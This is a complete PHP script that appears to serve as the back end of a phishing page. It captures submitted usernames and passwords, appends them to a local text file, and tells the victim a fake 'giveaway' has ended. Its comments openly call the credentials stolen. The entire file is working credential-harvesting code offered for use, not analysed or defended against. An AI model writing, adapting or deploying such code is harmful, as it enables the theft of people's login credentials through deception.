<?php
	//Capture the values of variables that are passed on
	$username = $_POST['username'];
	$password = $_POST['password'];
	
	//opening the textfile where credentials can be stored so as to append values.
	$myfile = fopen("networkCredentials.txt", "a") ;
	
	//create a string with the stolen username and password and assign it to the variable $txt
	$txt = "USERNAME = $username ,  PASSWORD = $password \n";
	
	//writing into the file we opened (We are actually appneding into the file.)
	fwrite($myfile, "\n".$txt);
	
	//close the link with the file
	fclose($myfile);

	//Telling the user that the offer is over
	echo "cThe giveaway program has ended as we have reached our giveaway quota. We will include you in our next giveaway.";
	
	//Redirect to a the very website with an error saying the offer is over.
	header('Location: ./redirect.php');
 ?>
